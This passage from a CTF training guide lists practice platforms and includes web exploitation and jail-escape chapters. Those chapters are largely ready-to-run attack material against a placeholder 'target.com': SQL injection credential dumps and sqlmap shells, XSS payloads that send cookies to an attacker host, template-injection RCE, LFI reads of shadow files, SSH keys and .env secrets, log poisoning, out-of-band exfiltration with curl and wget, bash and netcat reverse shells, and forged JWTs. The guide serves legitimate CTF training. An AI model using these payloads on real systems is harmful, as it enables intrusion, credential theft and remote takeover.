picoCTF Intermediate Crypto:
  → "rsa-pop-quiz"      : RSA math questions
  → "waves over lambda" : frequency analysis (substitution)
  → "Double DES"        : meet-in-the-middle attack
  → "PowerAnalysis"     : side channel
  → "NSA Backdoor"      : custom cipher analysis

HackTheBox Crypto Challenges (free):
  https://app.hackthebox.com/challenges?category=crypto
  Easy tier:
  → "Tempted"           : simple XOR
  → "Waiting for Godot" : RSA with small factors
  → "Pseudo Random"     : weak random number generator
  → "BabyEncryption"    : custom cipher, reverse it

OverTheWire: Krypton (free):
  https://overthewire.org/wargames/krypton/
  SSH-based challenges:
  → Krypton1: ROT13 → Krypton2: Caesar → Krypton3: Substitution
  → Krypton4: Vigenère → Krypton5: Vigenère broken → Krypton6: Stream
  8 levels, excellent for classical crypto!

★★★ ADVANCED (Month 2-3):
━━━━━━━━━━━━━━━━━━━━━━━━━

CryptoHack Advanced Sections:
  → "Elliptic Curves" section
  → "Hash Functions" section
  → "Diffie-Hellman" section

CTFtime Crypto Writeups (old CTF challenges):
  https://ctftime.org/writeups?tags=crypto
  Top CTFs for crypto:
  → CryptoCTF (annual, crypto-only, many difficulties)
     https://cr.yp.toc.tf/
  → Plaid CTF (hard crypto)
  → LACTF, ångstromCTF (good crypto sections)

Google CTF Crypto (hard, archived):
  https://capturetheflag.withgoogle.com/archive
  Past challenges available, extremely high quality

NahamCon CTF Crypto (intermediate):
  https://ctftime.org/event/1570 (search for archived)

★★★★ EXPERT (Month 3+):
━━━━━━━━━━━━━━━━━━━━━━━━

CryptoCTF (crypto-focused annual CTF):
  https://cr.yp.toc.tf/
  Dozens of carefully crafted crypto challenges

CSAW CTF Crypto (NYU, annual):
  https://ctf.csaw.io/

SEC-T CTF Crypto:
  https://ctftime.org/ (search SEC-T)

Study material alongside challenges:
  → "Cryptopals" challenges: https://cryptopals.com/
    Implement attacks in Python — teaches crypto deeply
  → Applied Cryptography book (free): https://www.schneier.com/books/applied-cryptography/
  → Dan Boneh's crypto course (free): https://www.coursera.org/learn/crypto
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

---

# PART 4 — WEB EXPLOITATION

---

# Chapter 27: Web Theory {#ch27}

## 27.1 How HTTP Works (What You Must Know)

```
HTTP REQUEST STRUCTURE:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
GET /page?id=1 HTTP/1.1          ← Method + URL + Version
Host: target.com                  ← Required header
Cookie: session=abc123            ← Authentication token
User-Agent: Mozilla/5.0           ← Browser identification
Content-Type: application/json    ← For POST requests
                                  ← Blank line separates headers from body
{"username":"admin"}              ← Body (POST only)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

STATUS CODES MEANING FOR CTF:
200 OK          → Normal success
301/302         → Redirect → follow the Location header!
401             → Need to login
403             → Logged in but not allowed → look for bypass
404             → Doesn't exist
405             → Method not allowed → try GET/POST/PUT/DELETE!
500             → Server error → bug found! Often means injection
                  works but output is hidden

HEADERS THAT LEAK INFORMATION:
X-Powered-By: PHP/7.2           → Exact PHP version!
Server: Apache/2.4.41 Ubuntu    → Web server + OS!
X-Generator: WordPress 5.2      → CMS version!

CTF FIRST STEPS FOR WEB:
1. View page source (Ctrl+U) → look for comments with hints
2. Check robots.txt → often reveals hidden pages!
3. Check DevTools Network tab → what requests are made?
4. Open Burp Suite → capture all traffic
5. Try every button and form
```

## 27.2 Burp Suite Setup

```
BURP SUITE SETUP (required for web CTF):
1. Open Burp Suite (Community Edition = free)
2. Proxy → Options → add 127.0.0.1:8080
3. Browser → Settings → Network → Manual proxy → 127.0.0.1:8080
4. Install Burp CA cert (for HTTPS):
   → Visit http://burp → Download CA certificate → Install in browser

KEY BURP TABS:
  Proxy → HTTP History : see ALL captured requests
  Repeater : modify and resend any request
  Intruder : automated fuzzing with wordlist
  Decoder  : encode/decode values (base64, URL, HTML)

MOST IMPORTANT: Right-click any request → Send to Repeater
  Then modify parameters freely and click Send to test!
```

---

# Chapter 28: SQL Injection {#ch28}

## 28.1 SQL Injection Step-by-Step

```bash
# DETECTION — add ' to any parameter:
curl "http://target.com/page?id=1'"
# Error message containing "SQL" or "mysql" → VULNERABLE!

# Confirm with boolean test:
curl "http://target.com/page?id=1 AND 1=1-- -"  # Normal
curl "http://target.com/page?id=1 AND 1=2-- -"  # Different
# Different responses = confirmed!

# ── UNION-BASED EXTRACTION ───────────────────────────────

# Find number of columns:
# id=1 ORDER BY 1-- -  (works)
# id=1 ORDER BY 2-- -  (works)
# id=1 ORDER BY 3-- -  (error → 2 columns!)

# Find which column shows:
curl "http://target.com/page?id=-1 UNION SELECT 1,2-- -"
# Whatever number appears in page = that column is visible

# Extract data (assume column 2 is visible, 2 columns total):
# Database name:
curl "http://target.com/page?id=-1 UNION SELECT 1,database()-- -"

# All table names:
curl "http://target.com/page?id=-1 UNION SELECT 1,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()-- -"

# Columns of 'users' table:
curl "http://target.com/page?id=-1 UNION SELECT 1,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'-- -"

# Dump credentials:
curl "http://target.com/page?id=-1 UNION SELECT 1,group_concat(username,':',password) FROM users-- -"

# ── LOGIN BYPASS ─────────────────────────────────────────
# In username field:
' OR '1'='1'-- -
admin'-- -
' OR 1=1-- -

# ── SQLMAP AUTOMATION ────────────────────────────────────
sqlmap -u "http://target.com/page?id=1" --batch --dbs
sqlmap -r request.txt --batch -D dbname -T users --dump
sqlmap -u "http://target.com/page?id=1" --batch --os-shell  # Shell!

# ── WAF BYPASS ────────────────────────────────────────────
# Space → /**/ or %09 (tab)
# Uppercase: UNION → uNiOn
# Comments: UN/**/ION SEL/**/ECT
```

---

# Chapter 29: XSS — Cross-Site Scripting {#ch29}

## 29.1 XSS Theory and Payloads

```javascript
// DETECT: any output of user input without encoding
<script>alert(1)</script>           // Most basic test

// If <script> blocked, try:
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input autofocus onfocus=alert(1)>
<iframe onload=alert(1)>

// CTF GOAL: Steal admin cookie!
// Set up receiver: python3 -m http.server 8000
// Use ngrok for public URL: ngrok http 8000

// Payload to steal cookie:
<script>document.location='http://YOUR_IP:8000/?c='+document.cookie</script>
// Shorter version:
<img src=x onerror="this.src='http://YOUR_IP:8000/?c='+document.cookie">

// After receiving cookie in your server log:
// Use it: curl -b "session=STOLEN_VALUE" http://target.com/admin

// XSS Hunter (automatic callback):
// https://xsshunter.trufflesecurity.com/
// Gives unique URL that logs any XSS + cookies automatically!

// DOM XSS (check JavaScript for these patterns):
document.write(location.hash)    // VULNERABLE
element.innerHTML = data         // VULNERABLE
eval(parameter)                  // VULNERABLE
```

---

# Chapter 30: SSTI {#ch30}

## 30.1 Server-Side Template Injection

```bash
# DETECT: inject math in template syntax
# {{7*7}} → if shows 49 → Jinja2 (Python/Flask)!
# ${7*7}  → Freemarker (Java)
# #{7*7}  → Pebble (Java)

# JINJA2 RCE (most common in CTF):
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Shorter Jinja2:
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{joiner.__init__.__globals__.os.popen('cat /flag').read()}}

# TWIG (PHP):
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# FREEMARKER (Java):
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

# AUTO-TEST: tplmap tool
# https://github.com/epinna/tplmap
# python3 tplmap.py -u "http://target.com/?name=test" --os-shell
```

---

# Chapter 31: File Inclusion (LFI/RFI) {#ch31}

## 31.1 LFI Exploitation

```bash
TARGET="http://target.com/index.php?page="

# DETECT:
curl "${TARGET}../../../../etc/passwd"
# If you see root:x:0:0:... → LFI!

# IMPORTANT FILES TO READ:
curl "${TARGET}../../../../etc/passwd"
curl "${TARGET}../../../../etc/shadow"   # Needs root
curl "${TARGET}../../../../home/user/.bash_history"
curl "${TARGET}../../../../home/user/.ssh/id_rsa"  # SSH key!
curl "${TARGET}../../../../var/www/html/config.php"
curl "${TARGET}../../../../var/www/html/.env"      # API keys!
curl "${TARGET}../../../../proc/self/environ"      # Process env

# PHP SOURCE CODE (via wrapper):
curl "${TARGET}php://filter/convert.base64-encode/resource=index"
echo "BASE64_OUTPUT" | base64 -d    # Decode to see source!

# EXECUTE CODE (php://input):
curl -X POST "${TARGET}php://input" -d '<?php system("id"); ?>'

# LOG POISONING → RCE:
# 1. Read access.log:
curl "${TARGET}../../../../var/log/apache2/access.log"
# 2. Inject PHP in User-Agent:
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/
# 3. Execute via LFI:
curl "${TARGET}../../../../var/log/apache2/access.log&cmd=id"

# PATH TRAVERSAL VARIANTS:
curl "${TARGET}....//....//....//etc/passwd"
curl "${TARGET}%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"  # URL encoded
curl "${TARGET}..%252f..%252f..%252fetc%252fpasswd"        # Double encoded
```

---

# Chapter 32: Command Injection {#ch32}

## 32.1 Command Injection

```bash
# SEPARATORS TO TRY (after normal input):
; id
| id
|| id
&& id
& id
`id`
$(id)
%0aid      # URL-encoded newline

# BLIND DETECTION (time-based):
; sleep 5
$(sleep 5)
# If response takes 5 extra seconds → confirmed!

# FILTER BYPASSES:
# Space filtered:
cat${IFS}/etc/passwd
cat</etc/passwd

# Keyword filtered:
# "cat" → use: head, tail, more, less, tac
# "bash" → use: sh, /bin/sh, dash

# Base64 bypass:
echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | bash
# Y2F0IC9ldGMvcGFzc3dk = base64("cat /etc/passwd")

# OUT-OF-BAND (blind, no output):
# Start server: python3 -m http.server 8000
; curl http://YOUR_IP:8000/$(id | base64 -w0)
; wget http://YOUR_IP:8000/$(cat /flag | base64 -w0)

# REVERSE SHELL:
; bash -i >& /dev/tcp/YOUR_IP/4444 0>&1
; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOUR_IP 4444>/tmp/f
```

---

# Chapter 33: Authentication Bypass and IDOR {#ch33}

## 33.1 JWT Attacks

```bash
# JWT structure: header.payload.signature
# Decode instantly at: https://jwt.io/

# ATTACK 1: Algorithm None
python3 << 'EOF'
import base64, json

# Decode existing JWT:
token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QifQ.SIGNATURE"
parts = token.split('.')
payload = json.loads(base64.b64decode(parts[1]+'=='))
print("Original payload:", payload)

# Modify payload:
payload['user'] = 'admin'
payload['role'] = 'admin'
new_payload = base64.b64encode(json.dumps(payload,separators=(',',':')).encode()).rstrip(b'=').decode()

# Change algorithm to none:
header = {"alg":"none","typ":"JWT"}
new_header = base64.b64encode(json.dumps(header,separators=(',',':')).encode()).rstrip(b'=').decode()

# Create token with empty signature:
evil_jwt = f"{new_header}.{new_payload}."
print("Evil JWT:", evil_jwt)
EOF

# ATTACK 2: Brute force HS256 secret
hashcat -a 0 -m 16500 "TOKEN" /usr/share/wordlists/rockyou.txt

# ATTACK 3: jwt_tool (comprehensive)
# pip3 install jwt_tool  OR  git clone https://github.com/ticarpi/jwt_tool
python3 jwt_tool.py "TOKEN" -X a    # Algorithm none attack
python3 jwt_tool.py "TOKEN" -C -d rockyou.txt  # Crack secret

# IDOR — change ID numbers:
curl -b "session=YOURS" http://target.com/api/user/1001/
curl -b "session=YOURS" http://target.com/api/user/1/    # Admin at ID 1!
curl -b "session=YOURS" http://target.com/api/user/0/    # Or ID 0!

# COOKIE MANIPULATION:
# admin=false → admin=true
# role=user   → role=admin
# base64 decode → modify → re-encode → send modified cookie
```

---

# Chapter 34: XXE, SSRF, Deserialization {#ch34}

## 34.1 XXE and SSRF

```bash
# XXE — XML External Entity:
curl -X POST http://target.com/api -H "Content-Type: application/xml" -d '
<?xml version="1.0"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>'
# If /etc/passwd appears → XXE!

# Read any file:
# Replace "file:///etc/passwd" with any path

# SSRF — Server-Side Request Forgery:
# Find URL parameters: url=, src=, href=, dest=, redirect=

curl "http://target.com/fetch?url=http://127.0.0.1/"
curl "http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/"  # AWS!

# SSRF filter bypasses:
# http://0.0.0.0/     → localhost
# http://[::1]/       → localhost IPv6
# http://2130706433/  → 127.0.0.1 as decimal
# http://127.1/       → short form
```

---

# Chapter 35: Web Practice Links — Easy to Hard {#ch35}

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
WEB EXPLOITATION PRACTICE LINKS: EASY → HARD
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

★ BEGINNER (Week 1-2, web fundamentals):
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

picoCTF Web Exploitation (free, always available):
  https://play.picoctf.org/practice?category=1
  Specific challenges (do in order!):
  → "GET aHEAD"        : HTTP methods (use OPTIONS, GET, POST, HEAD)
  → "Cookies"          : cookie manipulation (change cookie value)
  → "Inspect HTML"     : view source code (Ctrl+U)
  → "Search Source"    : read the JavaScript source
  → "where are the robots" : robots.txt reveals hidden page
  → "login-bypass"     : SQLi authentication bypass
  → "Super Serial"     : PHP deserialization
  → "Forbidden Paths"  : path traversal
  → "SQL Direct"       : SQLite injection
  → "Web Gauntlet"     : SQLi filter bypass series
  → "Includes"         : PHP file inclusion
  → "Trivial Flag Transfer Protocol" : TFTP forensics + web

TryHackMe Web Rooms (free tier):
  → "OWASP Top 10" (fundamental vulnerabilities):
     https://tryhackme.com/room/owasptop10
  → "OWASP Juice Shop" (hands-on web app):
     https://tryhackme.com/room/owaspjuiceshop
  → "SQL Injection" room:
     https://tryhackme.com/room/sqlinjectionlm
  → "Cross-Site Scripting":
     https://tryhackme.com/room/xss
  → "File Inclusion":
     https://tryhackme.com/room/fileinc
  → "Burp Suite Basics":
     https://tryhackme.com/room/burpsuitebasics

WebGoat (local practice application):
  https://github.com/WebGoat/WebGoat
  docker run -p 8080:8080 webgoat/webgoat
  → All OWASP Top 10 vulnerabilities in one app
  → With built-in hints and lessons

DVWA (Damn Vulnerable Web Application):
  https://github.com/digininja/DVWA
  docker run -p 80:80 vulnerables/web-dvwa
  → SQLi, XSS, Command Injection, File Inclusion, CSRF, Upload
  → 3 difficulty levels for each vulnerability

★★ INTERMEDIATE (Week 3-8):
━━━━━━━━━━━━━━━━━━━━━━━━━━━

HackTheBox Web Challenges (free retired ones):
  https://app.hackthebox.com/challenges?category=web
  Easy → Medium tier:
  → "BabyEncryption"    : custom cipher web API
  → "WayWitch"          : JWT attacks
  → "Toxic"             : PHP deserialization
  → "Templated"         : SSTI (Jinja2)
  → "Sanitize"          : SQLi with filters
  → "Blueprint"         : NodeJS injection
  → "Gunship"           : SSTI via Pug template
  → "Injection"         : NoSQL injection

PortSwigger Web Security Academy (free!):
  https://portswigger.net/web-security
  THE BEST free web security learning platform!
  100% free labs + theory:
  → "SQL injection":    https://portswigger.net/web-security/sql-injection
    All 18 SQLi labs from basic to blind to out-of-band
  → "XSS":             https://portswigger.net/web-security/cross-site-scripting
    30+ XSS labs
  → "SSRF":            https://portswigger.net/web-security/ssrf
  → "XXE":             https://portswigger.net/web-security/xxe
  → "File upload":     https://portswigger.net/web-security/file-upload
  → "Authentication":  https://portswigger.net/web-security/authentication
  → "Access control":  https://portswigger.net/web-security/access-control
  → "SSTI":            https://portswigger.net/web-security/server-side-template-injection
  → "Path traversal":  https://portswigger.net/web-security/file-path-traversal
  Complete "Apprentice" labs first, then "Practitioner"!

CTFlearn Web Category (free):
  https://ctflearn.com/challenge/browse?category=Web
  Work through 2-3 star challenges

★★★ ADVANCED (Month 2-3):
━━━━━━━━━━━━━━━━━━━━━━━━━

PortSwigger "Expert" labs:
  https://portswigger.net/web-security
  → "Advanced SQLi" (blind, time-based, OOB)
  → "HTTP request smuggling"
  → "Prototype pollution"
  → "OAuth attacks"
  → "JWT attacks"
  → "Web cache poisoning"

HackTheBox Medium/Hard Web:
  → "Cyber Apocalypse" CTF web challenges (annual)
  → "UHC Season" web challenges

Buggy Web Application (BWAPP):
  http://www.itsecgames.com/
  100+ different web vulnerabilities to practice

Injection labs:
  → NoSQL injection: https://github.com/digininja/pivoting-labs
  → GraphQL: https://github.com/dolevf/Damn-Vulnerable-GraphQL-Application

★★★★ EXPERT:
━━━━━━━━━━━━

PortSwigger Burp Suite Certified Practitioner (BSCP):
  https://portswigger.net/web-security/certification
  → Certification exam using PortSwigger labs
  → Industry-recognized web security credential!

Google CTF Web (hard):
  https://capturetheflag.withgoogle.com/archive

intigriti Monthly Challenges (free):
  https://challenge.intigriti.io/
  Monthly XSS challenge, expert level

Bug Bounty Programs (paid!):
  HackerOne: https://hackerone.com/bug-bounty-programs
  Bugcrowd:  https://bugcrowd.com/programs
  → Apply real web skills for real money!
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

---

# PART 5 — MISCELLANEOUS

---

# Chapter 36: Misc Theory {#ch36}

## 36.1 What Is "Misc" in CTF?

```
MISC = "Everything that doesn't fit elsewhere"

COMMON MISC TYPES:

1. PROGRAMMING CHALLENGES
   → Solve a math problem automatically via script
   → Interact with a server that sends rapid challenges
   → Process large data quickly

2. ENCODING PUZZLES
   → Multi-layer encoding (base64 of hex of rot13 of morse...)
   → QR codes, barcodes, data matrix codes

3. JAIL ESCAPES (pyjail, bash jail)
   → Restricted Python/shell environment
   → Find creative ways to execute code

4. SCRIPTED INTERACTION
   → Server sends many math problems, must answer in <1 second
   → Requires automated script using pwntools

5. VISUAL PUZZLES
   → ASCII art hidden messages
   → Braille, semaphore, flag codes, Wingdings

MISC STRATEGY:
→ Start with CyberChef Magic (auto-decodes many encodings)
→ Check for QR codes (zbarimg tool)
→ Look for common "puzzle cipher" patterns
→ For jail escapes: check what IS available, work from there
→ For rapid server challenges: script with pwntools immediately
```

---

# Chapter 37: Programming Challenges {#ch37}

## 37.1 Automated Server Interaction

```python
#!/usr/bin/env python3
from pwn import *
import re, hashlib, itertools, string

# PATTERN 1: Automated math problem solver
p = remote('challenge.ctf.com', 1337)

while True:
    line = p.recvline().decode().strip()
    if 'flag' in line.lower():
        print(f"FLAG: {line}"); break

    match = re.search(r'(\d+)\s*([+\-\*/])\s*(\d+)', line)
    if match:
        a, op, b = int(match.group(1)), match.group(2), int(match.group(3))
        result = {'+': a+b, '-': a-b, '*': a*b, '/': a//b}[op]
        p.sendline(str(result).encode())

# PATTERN 2: Proof of Work (very common in CTF!)
def solve_pow(prefix, target_start):
    """Find X such that sha256(prefix + X).startswith(target_start)"""
    charset = string.ascii_letters + string.digits
    for length in range(1, 8):
        for combo in itertools.product(charset, repeat=length):
            attempt = prefix + ''.join(combo)
            h = hashlib.sha256(attempt.encode()).hexdigest()
            if h.startswith(target_start):
                return ''.join(combo)
    return None

# Usage:
# Receive: "Send string X such that sha256('abc123' + X)[:6] == '000000'"
line = p.recvline().decode()
prefix = re.search(r"sha256\('([^']+)'\s*\+", line).group(1)
target = re.search(r"== '([^']+)'", line).group(1)
solution = solve_pow(prefix, target)
p.sendline(solution.encode())
```

---

# Chapter 38: Jail Escapes {#ch38}

## 38.1 Python Jail Techniques

```python
# PYTHON JAIL COMMON RESTRICTIONS:
# - import blocked
# - os, sys, subprocess not available
# - eval, exec blocked
# - Only specific builtins available

# TECHNIQUE 1: Get os via class hierarchy
# Every class inherits from object
# Some subclass has os imported!
for i, c in enumerate(''.__class__.__mro__[-1].__subclasses__()):
    if 'Popen' in str(c):
        print(i, c)  # Find the index
# Then: ''.__class__.__mro__[-1].__subclasses__()[N](['id'],stdout=-1).communicate()

# TECHNIQUE 2: Via builtins dict
__builtins__.__dict__['__import__']('os').system('id')

# TECHNIQUE 3: Via cycler/joiner (Jinja2 often uses these):
# cycler.__init__.__globals__.os.popen('id').read()

# TECHNIQUE 4: breakpoint() drops into pdb debugger!
breakpoint()
# In pdb: import os; os.system('id')

# TECHNIQUE 5: chr() bypass string filters
exec(chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(32)+chr(111)+chr(115))

# BASH JAIL ESCAPES:
# Read without cat: < /flag    head /flag    tac /flag    more /flag
# Execute: /bin/sh    python3 -c "import os;os.system('/bin/sh')"
# No space: cat${IFS}/flag    cat</flag
# No /: cd etc && cat passwd
```

---

# Chapter 39: QR Codes and Visual Puzzles {#ch39}

## 39.1 Decoding Visual Codes

```bash
# QR CODE DECODING:
zbarimg image.png           # Terminal decode
zbarimg --quiet image.png   # Just the data

# Online QR decoders:
# https://zxing.org/w/decode.jspx  (handles damaged/partial QR)
# https://scanqr.org/

# Generate QR for testing:
qrencode "CTF{test}" -o test_qr.png

# BARCODE TYPES AND TOOLS:
# EAN-13, Code-128, QR, DataMatrix → all handled by zbarimg

# VISUAL CIPHER REFERENCES:
# Pigpen cipher:   https://www.dcode.fr/pigpen-cipher
# Semaphore flags: https://www.dcode.fr/maritime-semaphore-flag
# Braille:         https://www.dcode.fr/braille-alphabet
# Dancing men:     https://www.dcode.fr/dancing-men-cipher (Sherlock Holmes!)
# Naval flags:     https://www.dcode.fr/nato-flag-alphabet
# Wingdings:       Copy text → change font to Wingdings in Word

# BINARY IMAGE (black/white grid = binary data):
python3 << 'EOF'
from PIL import Image
img = Image.open('binary_grid.png').convert('1')
bits = []
for y in range(img.height):
    for x in range(img.width):
        bits.append(0 if img.getpixel((x,y)) else 1)
text = ''
for i in range(0, len(bits)-7, 8):
    byte = int(''.join(str(b) for b in bits[i:i+8]), 2)
    if 32 <= byte <= 126:
        text += chr(byte)
print(text)
EOF
```

---

# Chapter 40: Misc Practice Links — Easy to Hard {#ch40}

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
MISCELLANEOUS PRACTICE LINKS: EASY → HARD
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

★ BEGINNER:
━━━━━━━━━━━

picoCTF General Skills (easiest misc category):
  https://play.picoctf.org/practice?category=6
  → "Python Wrangler"  : run a Python script
  → "Obedient Cat"     : use cat command
  → "Wave a Flag"      : use --help flag
  → "Nice netcat"      : nc to a server, convert output
  → "Static ain't always noise" : bash script reverse
  → "what's a net cat?" : nc basics
  → "bases"            : base conversion
  → "plumbing"         : piping commands

picoCTF Misc:
  https://play.picoctf.org/practice?category=9
  → Encoding challenges, QR codes, simple scripting

TryHackMe Misc Rooms:
  → "Linux Fundamentals" (all 3 parts):
     https://tryhackme.com/room/linuxfundamentalspart1
  → "Python Basics":
     https://tryhackme.com/room/pythonbasics
  → "Regular expressions":
     https://tryhackme.com/room/catregex

CTFlearn Misc (1-2 star):
  https://ctflearn.com/challenge/browse?category=Miscellaneous

★★ INTERMEDIATE:
━━━━━━━━━━━━━━━━

pwn.college (programming + binary interaction):
  https://pwn.college/
  → System security modules (free, university quality)
  → "Program Interaction" module especially

OverTheWire Bandit (Linux + bash skills):
  https://overthewire.org/wargames/bandit/
  → 34 levels of increasingly complex Linux commands
  → EXCELLENT for building CLI skills used in all CTF categories!
  → Level 0: ssh to server → Level 34: complex exploitation

OverTheWire Natas (web basics):
  https://overthewire.org/wargames/natas/
  → 34 levels of web CTF challenges
  → Beginners to intermediate web

pwntools practice (scripting challenges):
  → picoCTF "Heap 0/1/2/3" series
  → picoCTF "format string" series

HackTheBox Misc Challenges:
  https://app.hackthebox.com/challenges?category=misc
  → "The Art of Deceit" (encoding layers)
  → "Letter Bomb"       (email analysis)
  → "Spooky License"    (license key reverse)

★★★ ADVANCED (Month 2+):
━━━━━━━━━━━━━━━━━━━━━━━━

Shell Storm (pwntools + binary interaction):
  https://shell-storm.org/

CTFtime Misc Archives:
  https://ctftime.org/writeups?tags=misc
  → Find writeups of "misc" category, replicate the solutions

Cryptopals (programming + crypto):
  https://cryptopals.com/
  → Implement crypto attacks in Python
  → 8 sets, 64 challenges

Project Euler (math programming):
  https://projecteuler.net/
  → Good for building math + programming skill

Code Golf (minimal code challenges):
  https://code.golf/
  → Solve problems in fewest characters

★★★★ EXPERT:
━━━━━━━━━━━━

Pyjail Hall of Fame:
  https://github.com/salvatore-abello/python-ctf-cheatsheet
  → Collection of Python jail escapes for study

Advanced scripting challenges:
  → CTFtime events with programming category
  → plaidctf (Carnegie Mellon) misc/programming
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

---

# PART 6 — BECOMING PRO

---

# Chapter 41: Complete Platform Rankings {#ch41}

```
╔══════════════════════════════════════════════════════════════════════╗
║  ALL CTF PLATFORMS: COMPLETE RANKED LIST (FREE TO PLAY)              ║
╠══════════════════════════════════════════════════════════════════════╣
║  ★ = Beginner  ★★ = Intermediate  ★★★ = Advanced  ★★★★ = Elite     ║
╚══════════════════════════════════════════════════════════════════════╝

★ ABSOLUTE BEGINNER PLATFORMS:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

picoCTF                  🔗 https://picoctf.org/
  ★ Level: Beginner
  Free: Yes (100% free)
  Best for: FIRST CTF, all categories
  WHY START HERE: Best-designed beginner content, clear hints
  Always available, year-round practice
  Certificates available

CTFlearn                 🔗 https://ctflearn.com/
  ★ Level: Beginner
  Free: Yes
  Best for: First 2 weeks, community challenges

OverTheWire: Bandit      🔗 https://overthewire.org/wargames/bandit/
  ★ Level: Beginner (Linux skills)
  Free: Yes, always available
  Best for: Building Linux CLI skills (critical for all CTF!)

★★ INTERMEDIATE PLATFORMS:
━━━━━━━━━━━━━━━━━━━━━━━━━━

TryHackMe                🔗 https://tryhackme.com/
  ★★ Level: Beginner→Intermediate
  Free: Partial (core content free, $10/month Pro)
  Best for: Guided learning + CTF rooms
  RECRUITER VALUE: Certificates recognized in job postings!
  Has: Forensics, OSINT, Web, Crypto, RE, Misc paths

HackTheBox               🔗 https://app.hackthebox.com/
  ★★ Level: Intermediate
  Free: Retired machines + challenges free
  Best for: Pro-level skill building
  RECRUITER VALUE: HTB rank directly mentioned in job requirements!
  Has: Dedicated RE, Crypto, Forensics, Web, Misc challenge sections

CryptoHack               🔗 https://cryptohack.org/
  ★★ Level: Intermediate→Advanced (crypto only)
  Free: Yes (100% free)
  Best for: Deep cryptography skills
  Has: 100+ crypto challenges, certificates

CTFtime                  🔗 https://ctftime.org/
  ★★ Level: All levels
  Free: Yes
  Best for: Finding live competitions + reading writeups
  Use: Join competitions, post solutions, build team profile

PortSwigger Academy      🔗 https://portswigger.net/web-security
  ★★ Level: Beginner→Expert (web only)
  Free: Yes (100% free!)
  Best for: Deep web security skills + BSCP certification
  Has: 100+ guided labs across all web vulnerability types

★★ OTHER SPECIALIZED:
━━━━━━━━━━━━━━━━━━━━

OverTheWire Natas        🔗 https://overthewire.org/wargames/natas/
  Web CTF practice, 34 levels, beginner→intermediate

OverTheWire Krypton      🔗 https://overthewire.org/wargames/krypton/
  Classical cryptography, 8 levels

pwn.college              🔗 https://pwn.college/
  Binary exploitation + system security, free university quality

ROPemporium             🔗 https://ropemporium.com/
  ROP chain practice, 8 dedicated challenges

pwnable.kr               🔗 http://pwnable.kr/
  Binary/pwn focused, free, progressive

pwnable.tw               🔗 https://pwnable.tw/
  Higher quality pwn challenges

CyberDefenders           🔗 https://cyberdefenders.org/
  Blue team + DFIR, forensics focused, many free

BlueteamLabs             🔗 https://blueteamlabs.online/
  Incident response + forensics, free tier

Trace Labs               🔗 https://www.tracelabs.org/
  OSINT focused, real missing persons cases, free events

ImaginaryCTF             🔗 https://imaginaryctf.org/
  Monthly CTF, archived challenges, all categories, free

★★★ ADVANCED PLATFORMS:
━━━━━━━━━━━━━━━━━━━━━━━

Google CTF               🔗 https://capturetheflag.withgoogle.com/archive
  Hard, archived challenges free, top quality

CSAW CTF (NYU)           🔗 https://ctf.csaw.io/
  Annual, beginner→intermediate, well-organized

Angstrom CTF             🔗 https://angstromctf.com/
  Annual, student-run, archived, good quality

National Cyber League    🔗 https://nationalcyberleague.org/
  US-based, seasonal, employers look at rankings!

HackTheBox Academy       🔗 https://academy.hackthebox.com/
  Structured learning + CTF prep, some free modules

★★★★ ELITE PLATFORMS:
━━━━━━━━━━━━━━━━━━━━━

DEF CON CTF              🔗 https://defcon.org/html/links/dc-ctf.html
  World's most prestigious CTF, qualify via other CTFs

PlaidCTF (CMU)           🔗 https://plaidctf.com/
  Elite level, excellent challenges

CryptoCTF                🔗 https://cr.yp.toc.tf/
  Crypto-only annual CTF, all difficulty levels
```

---

# Chapter 42: Week-by-Week 6-Month Roadmap {#ch42}

```
╔══════════════════════════════════════════════════════════════════════╗
║  6-MONTH CTF MASTERY PLAN — WEEK BY WEEK                             ║
╚══════════════════════════════════════════════════════════════════════╝

MONTH 1: FOUNDATIONS
━━━━━━━━━━━━━━━━━━━━

WEEK 1 — Setup and First Steps:
  Mon: Install Kali Linux VM + all tools from Chapter 2
  Tue: Learn Linux CLI basics (Chapter 3): file, strings, xxd, base64
  Wed: picoCTF → "General Skills" → solve first 5 challenges
  Thu: CyberChef tutorial: try "Magic" on 10 different encoded strings
  Fri: picoCTF → "Forensics" → first 3 challenges (Lookey here, Information)
  Sat: Install stegsolve, zsteg, steghide — test on sample images
